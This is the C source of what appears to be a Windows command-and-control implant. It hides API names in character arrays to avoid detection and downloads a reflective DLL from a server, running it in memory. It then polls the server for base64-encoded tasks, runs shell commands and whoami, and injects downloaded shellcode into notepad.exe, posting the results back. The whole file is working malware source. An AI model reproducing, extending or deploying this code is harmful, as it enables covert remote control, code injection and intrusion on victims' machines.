// TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged
// TODO: is readJsonTask still modifying json?

#include "../include/addresshunter.h"
#include "../include/http.h"
#include "../include/typedefs.h"
#include <time.h>

// will be overwritten by ImhulluCLI
#ifndef SERVER_M
#define SERVER_M '1','9','2','.','1','6','8','.','0','.','1',0
#endif
#ifndef PORT_M
#define PORT_M 5001
#endif
#ifndef UUID_M
#define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
#endif

// TODO: Pass the name of the reflective loader as a parameter
/*
This function runs the function named "ReflectiveLoader" in a reflective dll
execueRD uses GetRLOffset which looks for the name "ReflectiveLoader"

Input:
    PAPI api: a pointer to the API struct

    PDLL: a pointer to the DLL struct that holds a reflective DLL

Output:
    Success -> HANDLE: handle to the new region the DLL has been written to, this handle needs to be freed

    Failure -> NULL
*/
HANDLE executeRD(PAPI api, PDLL pDll)
{
    DWORD loaderOffset;
    REFLECTIVELOADER pReflectiveLoader;
    DLLMAIN pDllMain;

    // get the offset of the reflective loader
    loaderOffset = GetRLOffset(api, pDll->pBuffer);

    #ifdef DEBUG
    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
    //((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)pDll->pBuffer + loaderOffset);
    #endif

    // get the real address of the reflective loader, cast it to a function
    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)pDll->pBuffer + loaderOffset);

    // TODO: Revert PAGE_EXECUTE_READWRITE protections
    // TODO: Use PAGE_EXECUTE_READ protections instead
    DWORD dwOldProtect;
    // give the memory region that holds the reflective loader execute-read-write permissions
    ((VIRTUALPROTECT)api->VirtualProtect)(pDll->pBuffer, pDll->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // run the reflective loader
    // reflective loader returns an address to DLLMain, cast it to a function pointer
    pDllMain = (DLLMAIN)pReflectiveLoader();

    #ifdef DEBUG
    CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
    #endif

    HANDLE hDllBase = NULL;

    if( pDllMain != NULL )
    {
        // call the loaded library's DllMain with DLL_QUERY_HMODULE to get its HMODULE (i.e. base address)
        // https://stackoverflow.com/questions/9545732/what-is-hmodule
        if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
        {
            #ifdef DEBUG
            CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
            #endif
            hDllBase = NULL;
        }
    }
    else
    {
        #ifdef DEBUG
        CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
        #endif
    }

    return hDllBase;
}

/*
This struct contains a series of null terminated strings called tokens
This struct represents a tokenized string

Members:
    CHAR* tokenizedString: contains a series of null terminated strings called tokens
    DWORD numberOfTokens: the amount of tokens that can be used to loop through the tokens
Example:
    First\0Second\0Third\0Token
Note:
*/
typedef struct Tokens
{
    CHAR* tokenizedString;
    DWORD numberOfTokens;
} Tokens, *PTokens;

/*
This function tokenizes a string

Input:
    [in] PAPI api: an instance of the API struct

    [in] CCHAR* str: the string to tokenize

    [in] CCHAR delim: a delimiter to use for tokenization

Output:
    A `Tokens` struct whose member `tokenizedString` needs to be freed

Note:
    The tokens can be retrieved using the getToken function

    // TODO: the final numberOfTokens value is not accurate if the last char 
    // or `delim` is not a null byte or if there are consecutive delimiters
*/
Tokens myStrtok(PAPI api, CCHAR* str, CCHAR delim)
{

    // initialize tokens with numberOfTokens 0 because str is null terminated therefore
    // numberOfTokens is increment at the end
    Tokens tokens = {NULL, 0};

    // calculate the buffer size for the tokenized string
    DWORD lenStr = myStrlenA(str);
    // create a new string that has the same size as `str` + a null byte
    tokens.tokenizedString = ((CALLOC)api->calloc)(lenStr+1, sizeof(CHAR));

    // copy the original string to the new buffer one by one, changing
    // the delim with a null byte for tokenization
    for (int i = 0; i < lenStr; i++)
    {
        if (str[i] == delim)
        {
            tokens.tokenizedString[i] = '\0';
            tokens.numberOfTokens++;
        }
        else
        {
            tokens.tokenizedString[i] = str[i];
        }
    }

    return tokens;
}

/*
This function retrieves a token in a Tokens struct

Input:
    Tokens tokenizedStr: a `Tokens` struct obtained from myStrtok

    DWORD index: the index of the requested token

Output:
    Success -> CHAR*: a pointer to the requested token

    Failure -> NULL

Note:
    the `tokenizedString` member of `tokens` must not have been freed before running the function
*/
CHAR* getToken(PAPI api, Tokens tokens, DWORD index)
{
    // return null if index is out of bounds
    if (index > tokens.numberOfTokens)
    {
        return NULL;
    }

    CHAR* token = tokens.tokenizedString;
    DWORD dwOffsetToNextToken = 0;
    for (DWORD i = 0; i < index; i++)
    {
        // (size of a token + null byte) gives us the offset to reach the next token
        token += myStrlenA(token)+1;
    }

    return token;
}

/*
This function recursively removes a character from the start of a string

Input:
    PAPI api: an API struct

    CCHAR* str: string 

    CHAR trim: character to trim


Output:
    A CHAR* that needs to be freed

*/
CHAR* myStartTrim(PAPI api, CCHAR* str, CHAR trim)
{
    // temporary variable
    CHAR* trimmedStr = str;

    // calculate the first index that doesn't have the trim character
    while (*trimmedStr == trim )
    {
        trimmedStr++;
    }

    // size of the trimmed string with the null byte
    DWORD dwSizeTrimmedString = myStrlenA(trimmedStr)+1;

    // create a buffer with the size of the trimmed string
    CHAR* outStr = ((CALLOC)api->calloc)(dwSizeTrimmedString, sizeof(CHAR));
    
    // copy the trimmed string over to that buffer
    myMemcpy(outStr, trimmedStr, dwSizeTrimmedString);

    return outStr;
}

/*
This function recursively removes a character from the end of a string

Input:
    CHAR* str: the string to trim
    CHAR trim: character to remove
Output:
    CHAR*: the new string
Note:
    The function modifies the input itself and returns it
    TODO: weird function, change it
*/
/*
CHAR* myEndTrim(CHAR* str, CHAR trim)
{
    for (int i=myStrlenA(str)-1; i>=0; i--)     // -1 for null terminator
    {
        if(str[i] == trim)
        { str[i] = '\0'; }          // change trim with a null terminator
        else
        { return str; }
    }
    return str;
}
*/

/*
This function recursively removes a character from the end of a string

Input:
    PAPI api: a pointer to the API struct

    CCHAR* str: string

    CHAR trim: character to remove

Output:
    Success -> a CHAR* that needs to be freed

    `str` is empty -> NULL

    memory allocation failed -> NULL

Note:
    TODO: add checks for `str` having only the `trim` character
*/
CHAR* myEndTrim(PAPI api, CCHAR* str, CHAR trim)
{
    if (myStrlenA(str) == 0)
    {
        return NULL;
    }

    // the index of the last character that is not `trim`
    DWORD dwLastIndex = myStrlenA(str)-1;

    // get the last index that doesn't hold a trim character
    while (dwLastIndex >= 0 && str[dwLastIndex] == trim)
    {
        dwLastIndex--;
    }

    // last index + 1 gives the size of the string without the null byte
    DWORD dwSizeOfTrimmedStr = dwLastIndex + 1;

    // allocate the buffer for the trimmed string including the null byte
    CHAR* trimmedStr = ((CALLOC)api->calloc)(dwSizeOfTrimmedStr + 1, sizeof(CHAR));

    if (trimmedStr == NULL)
    {
        return NULL;
    }

    // Copy the trimmed string
    for (DWORD i = 0; i < dwSizeOfTrimmedStr; i++)
    {
        trimmedStr[i] = str[i];
    }

    trimmedStr[dwLastIndex + 1] = '\0';
    return trimmedStr;
}

/*
This function recursively removes a character from both sides of a string

Input:
    PAPI api: a pointer to the API struct

    CHAR* str: the string to trim

    CHAR trim: the character to remove

Output:
    CHAR*: the trimmed string that needs to be freed
*/
CHAR* myTrim(PAPI api, CCHAR* str, CHAR trim)
{
    CHAR* startTrimmedStr = myStartTrim(api, str, trim);
    CHAR* outStr = myEndTrim(api, startTrimmedStr, trim);
    ((FREE)api->free)(startTrimmedStr);
    return outStr;
}

typedef struct jsonTask
{
    CHAR* taskId;
    CHAR* task;
    CHAR* taskType;
    CHAR* uuid;
} JsonTask, PJsonTask;

CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
{
    /*
    general structure of a json request
    [
        [
            284,
            "d2hvYW1p",
            "cmd",
            "9b6bf013-27ff-44ae-a39e-5020f3e0cb39"
        ],
        [
            285,
            "ZGly",
            "cmd",
            "9b6bf013-27ff-44ae-a39e-5020f3e0cb39"
        ]
    ]
    */

    CHAR* tmpJson = json;  // myStrtok modifies the string itself
    CHAR* task;
    CHAR delim = { '\n' };
    CHAR blacklist[] = { '[', ']', '\0' };
    // tokenize json
    Tokens tokensStruct = myStrtok(api, tmpJson, delim);

    // json is empty
    if (tokensStruct.tokenizedString[0] == '[' && tokensStruct.tokenizedString[1] == ']')
    {
        return NULL;
    }

    #ifdef DEBUG
    char hi[] = { 'N', 'u', 'm', 'b', 'e', 'r', 'O', 'f', 'T', 'o', 'k', 'e', 'n', 's', ':', ' ', '%', 'd', '\n', 0 };
    ((PRINTF)api->printf)(hi, tokensStruct.numberOfTokens);
    #endif

    CHAR* token;
    CHAR* trimmedToken1;
    CHAR* trimmedToken2;

    // this part of the code messy and can be improved using a struct(?)

    // start with the third line in the json because the first two are '['
    token = getToken(api, tokensStruct, 2);
    // remove spaces from the line
    trimmedToken1 = myTrim(api, token, ' ');
    // remove the comma
    *taskId = myEndTrim(api, trimmedToken1, ',');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;

    token = getToken(api, tokensStruct, 3);
    trimmedToken1 = myTrim(api, token, ' ');
    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
    // remove the double quotes
    task = myTrim(api, trimmedToken2, '"');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;

    token = getToken(api, tokensStruct, 4);
    trimmedToken1 = myTrim(api, token, ' ');
    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
    // remove the double quotes
    *taskType = myTrim(api, trimmedToken2, '"');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;

    token = getToken(api, tokensStruct, 5);
    trimmedToken1 = myTrim(api, token, ' ');
    trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
    // remove the double quotes
    *uuid = myTrim(api, trimmedToken2, '"');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;

    return task;
}

void myMain()
{
    API Api = { 0 };
    PAPI api = &Api;

    // Library Names
    CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR winhttp_c[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', 0 };
    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', 0 };
    CHAR crypt32_c[] = { 'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR shlwapi_c[] = { 's', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };

    // Library Declarations
    UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;
 
    // Function Names
    CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
    CHAR messageBoxW_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
    CHAR winHttpOpen_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
    CHAR winHttpConnect_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    CHAR winHttpOpenRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpSendRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpReceiveResponse_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
    CHAR WinHttpQueryDataAvailable_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
    CHAR winHttpQueryHeaders_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
    CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
    CHAR winHttpCloseHandle_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
    #ifdef DEBUG
    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
    #endif
    CHAR snprintf_c[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR malloc_c[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR free_c[] = { 'f', 'r', 'e', 'e', 0 };
    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
    CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
    CHAR createThread_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    CHAR waitForSingleObject_c[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    CHAR CryptStringToBinaryA_c[] = { 'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0 };
    CHAR CryptBinaryToStringA_c[] = { 'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0 };
    CHAR StrToIntW_c[] = { 'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0 };
    CHAR closeHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0 };
    CHAR exitThread_c[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0 };

    // Get Kernel32
    kernel32dll = GetKernel32();
    // GetLoadLibraryA
    api->LoadLibraryA = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);

    // Getting Libraries
    user32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(user32_c);
    msvcrtdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(msvcrt_c);
    winhttpdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(winhttp_c);
    crypt32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(crypt32_c);
    shlwapidll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(shlwapi_c);

    // WinHTTP
    api->WinHttpConnect = GetSymbolAddress((HANDLE)winhttpdll, winHttpConnect_c);
    api->WinHttpOpen = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpen_c);
    api->WinHttpOpenRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpenRequest_c);
    api->WinHttpSendRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpSendRequest_c);
    api->WinHttpReceiveResponse = GetSymbolAddress((HANDLE)winhttpdll, winHttpReceiveResponse_c);
    api->WinHttpQueryDataAvailable = GetSymbolAddress((HANDLE) winhttpdll, WinHttpQueryDataAvailable_c);
    api->WinHttpQueryHeaders = GetSymbolAddress((HANDLE)winhttpdll, winHttpQueryHeaders_c);
    api->WinHttpReadData = GetSymbolAddress((HANDLE)winhttpdll, winHttpReadData_c);
    api->WinHttpCloseHandle = GetSymbolAddress((HANDLE)winhttpdll, winHttpCloseHandle_c);

    // Getting functions
    // User32
    // Msvcrt
    // kernel32
    api->malloc = GetSymbolAddress((HANDLE)msvcrtdll, malloc_c);
    api->calloc = GetSymbolAddress((HANDLE)msvcrtdll, calloc_c);
    api->free = GetSymbolAddress((HANDLE)msvcrtdll, free_c);
    api->GetLastError = GetSymbolAddress((HANDLE)kernel32dll, getLastError_c);
    api->MessageBoxA = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
    api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
    #ifdef DEBUG
    api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
    api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
    #endif
    api->snprintf = GetSymbolAddress((HANDLE)msvcrtdll, snprintf_c);
    api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
    api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
    api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
    api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
    api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
    api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);
    api->ExitThread = GetSymbolAddress((HANDLE)kernel32dll, exitThread_c);

    // crypt32
    api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
    api->CryptBinaryToStringA = GetSymbolAddress((HANDLE)crypt32dll, CryptBinaryToStringA_c);

    // shlwapi
    api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);

    // downloaded DLL with the reflective loader in it
    DLL primalDll;
    PDLL pPrimalDll = &primalDll;
    pPrimalDll->pBuffer = NULL;

    WCHAR wServer[] = { SERVER_M } ;
    WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
    WCHAR uuid[] = { UUID_M } ;
    INTERNET_PORT port = PORT_M;

    #ifdef DEBUG
    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
    #endif
    WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
    while (pPrimalDll->pBuffer == NULL)
    {
        pPrimalDll->pBuffer = httpGetExecutable(api, &pPrimalDll->Size, wcStageEndpoint, wServer, port);
        ((SLEEP)api->Sleep)(5000);
        if (pPrimalDll->pBuffer != NULL)
        { break; }
        #ifdef DEBUG
        ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
        #endif
    }

    DLL esgStdDll;
    PDLL pEsgStdDll = &esgStdDll;
    pEsgStdDll->pBuffer = NULL;

    // the DLL is in its prime form after running the reflective loader
    pEsgStdDll->pBuffer = executeRD(api, pPrimalDll);

    // free the previous DLL
    ((FREE)api->free)(pPrimalDll->pBuffer);
    pPrimalDll->pBuffer = NULL;

    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
    CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };

    ESG_STD_API EsgStdApi = { 0 };
    PESG_STD_API PEsgStdApi = &EsgStdApi;

    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, runCmd_c);
    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
    PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, injectIntoProcess_c);

    //WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
    WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };

    CHAR* jsonResponse = NULL;
    CHAR* taskId = { 0 };
    CHAR* taskType = { 0 };
    CHAR* agentUuid = { 0 };
    CHAR* b64Task;
    CHAR* task = NULL;
    CHAR* orgOutput = NULL;
    DWORD taskSize;
    CHAR* taskOutput;
    CHAR* b64EncodedOutput;
    DWORD b64EncodedOutputSize;
    DWORD sizeOfOutput;
    CHAR jsonFormat[] =
    {
    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}'
    };
    DWORD totalJsonSize;
    CHAR* json;
    WCHAR fullPath2[] =
    {
        '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
        't', '/', UUID_M
    };

    while (TRUE)
    {
        jsonResponse = GetRequest(api, wServer, port, fullPath);

        if (!jsonResponse)
        {
            ((SLEEP)api->Sleep)(3000);
            continue;
        }

        b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);

        if (b64Task == NULL)
        {
            ((SLEEP)api->Sleep)(3000);
            continue;
        }

        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
        (
                (LPCSTR)b64Task,
                myStrlenA(b64Task),
                CRYPT_STRING_BASE64,
                NULL,
                &taskSize,
                NULL,
                NULL
        );
        task = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));

        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
        (
                (LPCSTR)b64Task,
                myStrlenA(b64Task),
                CRYPT_STRING_BASE64,
                (PBYTE)task,
                &taskSize,
                NULL,
                NULL
        );

        CHAR cmd[] = { 'c', 'm', 'd', 0 };
        CHAR whoami[] = { 'w', 'h', 'o', 'a', 'm', 'i', 0 };
        CHAR shutdown[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 };
        CHAR executeAssembly[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
        if (my_strcmp(taskType, cmd) == 0)
        {
            orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
            taskOutput = myTrim(api, orgOutput, '\n');
        }
        else if (my_strcmp(taskType, whoami) == 0)
        {
            orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
            taskOutput = myTrim(api, orgOutput, '\n');
        }
        else if (my_strcmp(taskType, shutdown) == 0)
        {
            const DWORD dwEncodedExitOutputSize = 17;
            CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
            totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
            json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
            ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, encodedExitOutput);
            PostRequest(api, wServer, port, fullPath2, json);

            if (pEsgStdDll->pBuffer)
            {
                ((FREE)api->free)(pEsgStdDll->pBuffer);
            }
            if (json)
            {
                ((FREE)api->free)(json);
            }
            if (task)
            {
                ((FREE)api->free)(task);
            }

            ((EXITTHREAD)api->ExitThread)(0);
        }
        else if (my_strcmp(taskType, executeAssembly) == 0)
        {
            CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
            DWORD dwShellcodeSize;
            WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
            LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
            taskOutput = executeAssembly;
        }
        else
        {
            ((SLEEP)api->Sleep)(3000);
            continue;
        }

        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
        b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);

        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
        json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
        PostRequest(api, wServer, port, fullPath2, json);

        if (taskId)
        {
            ((FREE)api->free)(taskId);
            taskId = NULL;
        }
        if (orgOutput)
        {
            ((FREE)api->free)(orgOutput);
            orgOutput = NULL;
        }
        if (b64EncodedOutput)
        {
            ((FREE)api->free)(b64EncodedOutput);
            b64EncodedOutput = NULL;
        }
        if (jsonResponse)
        {
            ((FREE)api->free)(jsonResponse);
            jsonResponse = NULL;
        }
        if (json)
        {
            ((FREE)api->free)(json);
            json = NULL;
        }
        if (task)
        {
            ((FREE)api->free)(task);
            task = NULL;
        }

        ((SLEEP)api->Sleep)(3000);
    }
    if (pEsgStdDll->pBuffer)
    {
        ((FREE)api->free)(pEsgStdDll->pBuffer);
        pEsgStdDll->pBuffer = NULL;
    }
}

